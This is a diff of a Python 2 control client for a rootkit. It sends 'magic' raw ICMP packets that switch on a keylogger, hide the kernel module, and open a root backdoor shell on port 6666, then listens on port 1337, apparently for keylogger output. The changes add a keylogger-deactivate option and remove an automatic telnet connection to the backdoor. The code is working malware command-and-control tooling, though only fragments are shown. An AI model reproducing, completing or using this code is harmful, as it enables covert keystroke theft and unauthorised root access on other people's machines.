@@ -58,7 +58,6 @@ def create_packet(code):
 
 def send_message(dest_addr, code):
     my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
-    host = socket.gethostbyname(dest_addr)
     
     packet = create_packet(code)
     while packet:
@@ -68,13 +67,11 @@ def send_message(dest_addr, code):
         packet = packet[sent:]
     my_socket.close()
 
-def get_ip(args):
-    return 1
-
 def print_usage():
     print "usage:", sys.argv[0], "\t[-a key] [-d key] [-h <host>]"
     print "\t\t\t\t[-u]"
-    print "-a key\t","sends a magic package to the rootkit and activates the keylogger"
+    print "-a key\t","sends a magic package to the rootkit and activates the keylogger and listens"
+    print "-d key\t","sends a magic package to the rootkit and de-activates the keylogger and listens"
     print "-a hide\t","sends a magic package to the rootkit and activates modul hiding"
     print "-d hide\t","sends a magic package to the rootkit and deactivates modul hiding"
     print "-a root\t","sends a magic package to the rootkit and deactivates the root shell"
@@ -86,8 +83,8 @@ def is_admin():
         sys.exit("\nYou must be root to run the application with this option, please use sudo and try again.\n")  
 
 def getNetworkIp():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(('google.at', 0))
+    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    #s.connect(('google.at', 0))
     #return s.getsockname()[0]
     return "0.0.0.0"
 
@@ -107,28 +104,26 @@ host = ""
 options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
 if len(sys.argv) != 1:
 	listen=False
-	start_root=False
 	for opt, arg in options:
-		if opt == "-a" and arg == "key":
-			code = ROOTKIT_KEYLOGGER_ACTIVATE
-			listen=True
-		elif opt == "-d" and arg == "hide":
-			code = HIDEMODULE_DEACTIVATION_CODE
-		elif opt == "-a" and arg == "hide":
-			code = HIDEMODULE_ACTIVATION_CODE
-		elif opt == "-h":
-			host = arg
-		elif opt == "-a" and arg == "root":
-			code = BACKDOOR_ACTIVATION_CODE
-			start_root=True
+          if opt == "-a" and arg == "key":
+               code = ROOTKIT_KEYLOGGER_ACTIVATE
+               listen=True
+          elif opt == "-d" and arg == "key":
+               code = ROOTKIT_KEYLOGGER_DEACTIVATE
+          elif opt == "-d" and arg == "hide":
+               code = HIDEMODULE_DEACTIVATION_CODE
+          elif opt == "-a" and arg == "hide":
+               code = HIDEMODULE_ACTIVATION_CODE
+          elif opt == "-h":
+               host = arg
+          elif opt == "-a" and arg == "root":
+               code = BACKDOOR_ACTIVATION_CODE
+               print "backdoor open on port 6666"
 		    
 	is_admin()
 	send_message(host, code)
 	if listen:
 		start_socket(1337)
-	if start_root:
-		from subprocess import call
-		call(["telnet", host, "6666"])
 else:
     print_usage()
 
